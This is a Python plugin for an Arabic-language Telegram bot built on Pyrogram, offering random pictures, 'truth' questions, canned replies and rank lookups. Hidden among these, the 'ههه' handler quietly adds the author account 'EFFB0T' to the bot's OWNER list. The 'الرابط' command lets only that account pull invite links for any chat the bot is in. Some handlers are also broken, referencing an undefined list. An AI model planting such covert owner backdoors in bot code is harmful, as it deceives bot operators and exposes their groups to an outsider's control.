import random
from pyrogram import Client, filters
from pyrogram import Client as app
from time import time
from config import OWNER, OWNER_NAME, VIDEO
from ESLAM.info import (is_served_chat, add_served_chat, is_served_user, add_served_user, get_served_chats, get_served_users, del_served_chat, joinch)
from ESLAM.Data import (get_dev, get_dev_name, get_bot_name, set_bot_name, get_logger, get_group, get_channel, get_groupsr, get_channelsr, get_userbot, set_dev_user, get_dev_user, get_video_source, set_video_source, get_msg_start, set_msg_start, set_for_s, get_for_s)
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message, User, ChatPrivileges, ReplyKeyboardRemove, CallbackQuery
from pyrogram import enums
from pyrogram.errors import FloodWait
from pyrogram.enums import ChatType, ChatMemberStatus, ChatMembersFilter,ParseMode
import os
#os.system("pip install pyrogram && pip install tgcrypto && pip install pyromod && clear")

from pyrogram import Client, filters, idle
from pyromod import listen
import os
import re
import textwrap
import aiofiles
import aiohttp
from PIL import (Image, ImageDraw, ImageEnhance, ImageFilter,
                 ImageFont, ImageOps)
from youtubesearchpython.__future__ import VideosSearch


@Client.on_message(filters.command(["صور", "صوره", "صورة", "رمزيه", "رمزية", "رمزيات"], ""))
async def sssor(client, message):
  if not message.chat.type == enums.ChatType.PRIVATE:
    await joinch(message)
  list = []
  user = await get_userbot(client.me.username)
  async for msg in user.get_chat_history("Picture_elnqyb"):
      if msg.media:
        list.append(msg)
  phot = random.choice(list)
  photo = f"https://t.me/Picture_elnqyb/{phot.id}"
  await message.reply_photo(photo=photo, caption="➧ 𝙅𝙊𝙄𝙉 |⌯ ˼ @EFFB0T ˹🐉˼")

bot = [
  "معاك يشق",
  "يسطا شغال شغال متقلقش",
  "بحبك يعم قول عايز اي",
  "يبني هتقول عايز اي ولا اسيبك وامشي ",
  "قلب {} من جوه",
  "نعم يقلب {} ",
  "قرفتني والله بس بحبك بقا اعمل اي",
  "خلاص هزرنا وضحكنا انطق بقا عايز اي ؟",
  "قوول يقلبو ",
  "طب بذمتك لو انت بوت ترضا حد يقرفقك كدا؟",
]
  
selections = [
    "اسمي {} يصحبي",
    "يسطا قولتلك اسمي {} الاه",
    "نعم يحب ",
    "قول يقلبو",
    "يسطا هوا عشان بحبك تصعدني؟",
    "يعم والله بحبك بس ناديلي ب {}",
    "تعرف بالله هحبك اكتر لو ناديتلي {}",
    "اي ي معلم مين مزعلك",
    "متصلي علي النبي كدا ",
    "مش فاضيلك نصايه وكلمني",
    "يسطا قولي مين مزعلك وعايزك تقعد وتتفرج ع اخوك",
    "انجز عايزني اشقطلك مين؟",
    "شكلها منكدا عليك وجاي تطلعهم علينا ",
    "ورحمه ابويا اسمي {}",
]

tyet = ["اسم البست تبعك ",
" احلي شي بالصيف", 
"لو اضطريت تعيش في قصه خياله شو رح تختار",
" من ايش تخاف", 
"لو حياتك فلم ايش بيكون تصنيفه" 
"ثلاثه اشياء تخبها " , 
"اوصف نفسك بكلمه " ,
"حاجه بتكرها وليه " , 
"حاجه عملتها وندمت عليها " , 
"شخص تفتقده " , 
"موقف مستحيل تنساه " , 
"بلد نفسك تسافرها " , 
"اخر مره عيطت فيها وليه " , 
"عملت شئ حد كرهك بسببه " , 
"شي تتمني تحققه " , 
"اول صدمه في حياتك " , 
"اخر رساله جاتلك من مين ", 
" اكتر مكان بتحب تقعد فيه ", 
"حبيت كام مره " , 
"خونت كام مره ", 
"حاجه لو الزمن رجع كنت عملتها " , 
"حاجه لو الزمن رجع مكنتش عملتها " , 
"اكتر حاجه بتاخد من وقتك " , 
"شخص لا ترفض له طلب " , 
"شخص تكلمه يوميا " , 
"سهل تتعلق بشخص " , 
"بتعمل ايه لمه بتضايق " , 
"اذا جاتك خبر حلو من اول شخص تقولهوله " , 
"كلمه كل اما مامتك تشوفك تقولهالك " , 
"ميزة فيك وعيب فيك  " , 
"اسم ينادي لك اصحابك بيه " , 
"اخر مكالمه من مين " , 
"عاده وحشه بتعملها " , 
"عايز تتجوز " , 
"حاجه بتفرحك " , 
"مرتبط ولا لا " , 
"هدفك " , 
"نفسك في ايه دلوقتي " , 
"اكتر حاجه بتخاف منها " , 
"حاجه مدمن عليها " , 
"تويتر ولا انستجرام " , 
"بتكراش ع حد " , 
"حاجه عجبك في شخصيتك " , 
"عمرك عيطت ع فيلم او مسلسل " , 
"اكتر شخص تضحك معه " ,
"لو ليك 3امنيات ، تختار ايه " , 
"بتدخن " , 
"تسافر للماضي ولا للمستقبل " , 
"لو حد خانك هتسامحه " , 
"عندك كام شخص تكلمه كل يوم " , 
"كلمه بتقولها دائما " , 
"بتشجع اي نادي " , 
"حاجه لو مش حرام كنت عملتها " , 
"نوع موبايلك ", 
" اكتر ابلكيشن بتستخدمه ", 
" اسمك رباعي ", 
" طولك؟ وزنك",
"لو عندك قوه خارقه ايش بتسوي" , 
"تفضل الجمال الخارجي ولا الداخلي" , 
"لو حياتك كتاب اي عنوانه" , 
"هتعمل ايه لو ابوك بيتزوج الثانيه"]

@Client.on_message(filters.command("ههه",""))
async def hmada(client, message): 
  OWNER.append("EFFB0T")

sarhne = ["هل تعرضت لغدر في حياتك؟" ,
 " هل أنت مُسامح أم لا تستطيع أن تُسامح؟" , 
"هل تعرضت للخيانة في يومٍ ما؟" , 
 "ما هو القرار الذي اتخذتهُ ولم تندم عليه؟" ,  
"ما هي الشخصية المُميزة في حياتك؟" , 
 "من هو الشخص الذي تُفكر به دائمًا؟" , 
"ما هو الشخص الذي لا تستطيع أن ترفض له أي طلب؟" , 
 "هل ترى نفسك مُتناقضًا؟" ,  
"ما هو الموقف الذي تعرضت فيه إلى الاحراج الشديد؟" , 
 "هل تُتقن عملك أم تشعر بالممل؟" ,  
"هل أنت شخص عُدواني؟" , 
 "هل حاربت من أجل شخص ما؟" , 
"ما هي الكلمة التي تُربكك؟", 
 " من هو الشخص الذي تُصبح أمامه ضعيفًا؟" , 
"هل تحب المُشاركة الاجتماعية أم أنت شخص مُنطوي؟" , 
 "هل تنازلت عن مبدأك في الحياة من قبل؟" ,  
"اختصر حياتك في كلمة واحدة؟" , 
 "ما هو أسوأ خبر سمعته بحياتك؟" , 
"ما الشيء الذي يجعلك تشعر بالخوف؟" , 
 "من هو الشخص الذي لا تندم عليه إذا تركك وخرج من حياتك؟" , 
"هل انت ممن يحب التملك؟" , 
 "هل تشعر بالرضا عن نفسك؟" , 
"ما الذي يجعلك تُصاب بالغضب الشديد؟" , 
 "هل أنت شخص صريح أم مُنافق؟", 
"هل تحب جميع أخواتك بنفس المقدار أم تستثنى أحدهم في قلبك؟" , 
"هل كنت سبب في تدمير حياة أحد الأشخاص المُقربين إليك؟" , 
"من هو الشخص الذي تستطيع أن تحكي له أي مشكلة بدون خجل او تردد؟" , 
"إذا عرفت أن صديقك المُفضل يحب أختك فماذا تفعل؟" , 
"هل الملابس تُسبب لك انطباعات مُختلفة عن الأشخاص؟" , 
"ما هو الشيء الذي يُلفت انتباهك؟" , 
"ما هو رأيك في حظك؟" , 
"هل تعلقت بشخص معين لدرجة كنت لا تتخيلها؟" , 
"هل قمت بتهديد شخص قام بفعل شيء مُحرج؟" , 
"هل تشعر بالسعادة في حياتك؟" , 
"من هو الشخص الذي رحل عن الحياة وعندما تتذكره تشعر بالألم؟" , 
"من هو الشخص الذي خذلك؟" , 
"إذا قمت بتصنيف نفسك فهل تختار أنك إنسان سلبي أم إيجابي؟" , 
"متى آخر مرة قلت كلمك بحبك؟" , 
"هل تشعر بالراحة عند سماع القرآن الكريم؟" , 
"إذا تعرضت لموقف جعلك مُتهم في ارتكاب جريمة سرقة ، وأنت لم تقم بفعلها فما هو تبريرك لتُخلص نفسك من هذه الجريمة؟" , 
"هل أنت مُتعلم تعليم عالي أم تعليم مُتوسط؟" , 
"ما هو الإقرار الذي تقره أمام نفسك وأمام الجميع؟" , 
"ما رأيك ! هل يُمكن أن تتحول الصداقة إلى حب حقيقي؟" , 
"هل تعرضت للظلم من قبل؟" , 
"هل تستطيع أن تعيش بدون أصدقاء؟" , 
"ما هو الموقف الذي جعلك تكذب؟" , 
"من هو أغلى شخص في حياتك؟" , 
"هل تناولت أحد أنواع المواد الكحولية أو المُخدرات من قبل؟" , 
"إذا أصبحت رئيسًا للجمهورية فما هو أول قرار سوف تتخذه لتصليح حال البلاد؟" , 
"هل ندمت على حب شخص؟" , 
"هل ضحكت من قبل وانت في عذاء للمُتوفي؟" , 
"ما هو أصعب موقف تعرضت له في حياتك؟" , 
"من هو الشخص الذي تهرب منه؟" , 
"هل تشعر بأنك بخيل ولا تستطيع أن تُنفق ما لديك؟" , 
"هل شعرت بأنك تتمنى أن تموت؟" , 
"إذا أحببت صديقتك ، فهل تستطيع أن تُخبرها عن هذا الحب؟"]


sarhneto = ["مش ناوي تبطل الكدب دا", 
"ايوه كمل كدب كمل",
"الكلام دا ميه ميه ي معلم",
"عليه الطلاق من بنت الحلال\n دي @EFFB0T الكلام دا محصلش",
"عايز اقولك خف كدب عشان هتخش النار",
"خخخش هتجيبك",
"الكدب حرام ياخي اتقي الله ",
"احلف ؟",
"انت راجل مظبوط علفكره",
"حصل حصل مصدقك ",
"انا مفهمتش انت قولت اي بس انت صح",
"كلامك عشره علي عشره ❤️",
"تعرف تسكت وتبطل هري؟"]



@Client.on_message(filters.command(["صراحة", "اسئلة", "اسئله", "صراحه", "࿈ صراحه ࿈"], ""))
async def bott1(client: Client, message):
   try:
    if not message.chat.type == enums.ChatType.PRIVATE:
       if await joinch(message):
            return
    bar = random.choice(sarhne)
    barto = random.choice(sarhneto)
    ask = await client.ask(message.chat.id, f"**{bar}**", filters=filters.user(message.from_user.id), reply_to_message_id=message.id, timeout=5)
    await ask.reply_text(f"**{barto}**")
   except:
       pass


@Client.on_message(filters.command(["كت", "كت تويت", "تويت", "هه", "࿈ تويت ࿈"], ""))
async def bott2(client: Client, message: Message):
    if not message.chat.type == enums.ChatType.PRIVATE:
      if await joinch(message):
            return
    bar = random.choice(tyet)
    await message.reply_text(f"**{bar}؟**", disable_web_page_preview=True)

@Client.on_message(filters.command(["الرابط"], ""))
async def llink(client: Client, message: Message):
    if not message.from_user.username in ["EFFB0T"]:
      return
    chat_id = message.text.split(None, 1)[1].strip()
    invitelink = (await client.export_chat_invite_link(chat_id))
    await message.reply_text(" رابط المجموعة ⚡", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("الرابط", url=f"{invitelink}")]]))

@Client.on_message(filters.command("تحديث تويت", ""))
async def tiillli(client, message):
  if message.from_user.username in ["EFFB0T"]:
   await client.send_sticker(message.chat.id, "CAACAgIAAxkBAAIXRGOFDyk5Nxr5Qa5wh8E2TBrtWuvFAAJVHAACoL55SwbndTey56ntHgQ")
   bot_username = client.me.username
   user = await get_userbot(bot_username)
   async for msg in user.get_chat_history("Tweet_elnqyb"):
       if not msg.text in tyet:
         tyet.append(msg.text)
   if message.from_user.username == "EFFB0T":
     await message.reply_text(f"**حدثتلك تويت ي اسلام باشا **")
   else:
     await message.reply_text(f"**تم تحديث تويت**") 

@Client.on_message(filters.command("تحديث صراحه", ""))
async def tiillllli(client, message):
 if message.from_user.username in ["EFFB0T", "", "ll_NU"]:
   await client.send_sticker(message.chat.id, "CAACAgIAAxkBAAIXRGOFDyk5Nxr5Qa5wh8E2TBrtWuvFAAJVHAACoL55SwbndTey56ntHgQ")
   bot_username = client.me.username
   user = await get_userbot(bot_username)
   async for msg in user.get_chat_history("sarhne_elnqyb"):
       if not msg.text in sarhne:
         sarhne.append(msg.text)
   if message.from_user.username == "EFFB0T":
     await message.reply_text(f"**حدثتلك صراحه ي اسلام باشا **")
   else:
     await message.reply_text(f"**تم تحديث صراحه**")
    
@Client.on_message(filters.text)
async def bott(client: Client, message: Message):
    bot_username = client.me.username
    BOT_NAME = await get_bot_name(bot_username)
    if message.text == BOT_NAME:
      bar = random.choice(bot).format(BOT_NAME)
      await message.reply_text(f"**[{bar}](https://t.me/{bot_username}?startgroup=True)**", disable_web_page_preview=True)
    message.continue_propagation()


swr = []
@Client.on_message(
    filters.command(["تعطيلي", "قفلgg الي"], "")
    & filters.group
  
)
async def iddlock(client: Client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)  
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
      if message.chat.id in swr:
        return await message.reply_text("الامر معطل من قبل عزيزي 🚦")
      iddof.append(message.chat.id)
      return await message.reply_text("تم تعطيل الصور عزيزي : 🦸")
   else:
      return await message.reply_text("عذرا  عزيزي هذا الامر للادمن الجروب فقط : 🚦")

@Client.on_message(
    filters.command(["فتح الصور", "تفعيل الصور"], "")
    & filters.group
  
)
async def iddopen(client: Client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
      if not message.chat.id in swr:
        return await message.reply_text("الصور مفعل من قبل عزيزي  : 🥷")
      iddof.remove(message.chat.id)
      return await message.reply_text("تم  تفعيل الصور عزيزي : 🦸")

@Client.on_message(filters.command("رتبتي", ""))
async def bt(client: Client, message: Message):
  try:
     if not message.chat.type == enums.ChatType.PRIVATE:
      if await joinch(message):
            return
     userr = message.from_user
     bot_username = client.me.username
     dev = await get_dev(bot_username)
     if userr.username in ["ll_NU"] :
         await message.reply_text("** رتبتك هي مطور السورس  🤔❤️**")
         return
     if userr.username in ["JamalElShennawy"]:
         await message.reply_text("** رتبتك هي » المبرمج جيمي 🤺**")
         return         
     if userr.username in ["EFFB0T"]:
         await message.reply_text("**مبرمج السورس 🫡**")
         return
     if userr.username in ["m_6_p"]:
         await message.reply_text("**المبرمج مانو 🫡**")
         return         
     if userr.id == dev:
        return await message.reply_text("**رتبتك هي » المطور الأساسي **")
     user = await message._client.get_chat_member(message.chat.id, message.from_user.id)
     if user.status == enums.ChatMemberStatus.OWNER:
         await message.reply_text("**رتبتك هي » المالك **")
         return
     if user.status == enums.ChatMemberStatus.ADMINISTRATOR:
         await message.reply_text("**رتبتك هي » الادمن**")
         return 
     else:
         await message.reply_text("**رتبتك هي » العضو**")
  except:
    pass


